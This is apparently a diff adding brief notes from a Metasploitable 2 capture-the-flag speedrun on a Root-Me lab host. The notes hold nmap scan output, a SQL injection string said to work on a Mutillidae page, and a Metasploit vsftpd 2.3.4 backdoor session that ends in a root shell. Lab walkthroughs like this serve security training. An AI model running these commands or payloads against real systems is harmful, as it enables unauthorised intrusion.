@@ -1,0 +1,102 @@
+Metasploitable 2 speedrun:
+time taken: 5 minutes
+
+nmap:
+
+Nmap scan report for ctf06.root-me.org (212.83.142.83)
+Host is up (0.12s latency).
+Not shown: 977 closed ports
+PORT     STATE    SERVICE     VERSION
+21/tcp   open     ftp         vsftpd 2.3.4
+22/tcp   open     ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open     telnet      Linux telnetd
+25/tcp   filtered smtp
+53/tcp   open     domain      ISC BIND 9.4.2
+80/tcp   open     http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open     rpcbind     2 (RPC #100000)
+139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open     exec        netkit-rsh rexecd
+513/tcp  open     login?
+514/tcp  open     shell       Netkit rshd
+1099/tcp open     rmiregistry GNU Classpath grmiregistry
+1524/tcp open     shell       Metasploitable root shell
+2049/tcp open     nfs         2-4 (RPC #100003)
+2121/tcp open     ftp         ProFTPD 1.3.1
+3306/tcp open     mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open     postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open     vnc         VNC (protocol 3.3)
+6000/tcp open     X11         (access denied)
+6667/tcp open     irc         UnrealIRCd
+8009/tcp open     ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+
+
+Network Distance: 2 hops
+Service Info: Hosts: localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 86.43 seconds
+
+' or 1=1 -- works on the http://ctf06.root-me.org/mutillidae/index.php?page=index.php
+
+21/tcp   open     ftp         vsftpd 2.3.4
+lets look at this ftp server. it's probably called "metasploitable" for a reason...
+
+msf > search vsftpd
+
+OH LOOK. 
+
+Matching Modules
+================
+
+   Name                                  Disclosure Date  Rank       Description
+   ----                                  ---------------  ----       -----------
+   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
+
+
+msf > use exploit/unix/ftp/vsftpd_234_backdoor 
+msf exploit(vsftpd_234_backdoor) > set RHOST exploit/unix/ftp/vsftpd_234_backdoor Interrupt: use the 'exit' command to quit
+msf exploit(vsftpd_234_backdoor) > set RHOST 212.83.142.83
+RHOST => 212.83.142.83
+msf exploit(vsftpd_234_backdoor) > exploit
+
+[*] 212.83.142.83:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 212.83.142.83:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+msf exploit(vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  212.83.142.83    yes       The target address
+   RPORT  21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(vsftpd_234_backdoor) > set LHOST (YOUR PUBLIC IP)
+LHOST => (YOUR PUBLIC IP)
+msf exploit(vsftpd_234_backdoor) > set LPORT 4447
+LPORT => 4447
+msf exploit(vsftpd_234_backdoor) > exploit
+
+[*] 212.83.142.83:21 - The port used by the backdoor bind listener is already open
+[+] 212.83.142.83:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+l[*] Command shell session 1 opened (LAN ip -> 212.83.142.83:6200) at 2017-05-26 20:10:03 -0600
+
+There is a bunch of other stuff on here as well. This is the quick and dirty way
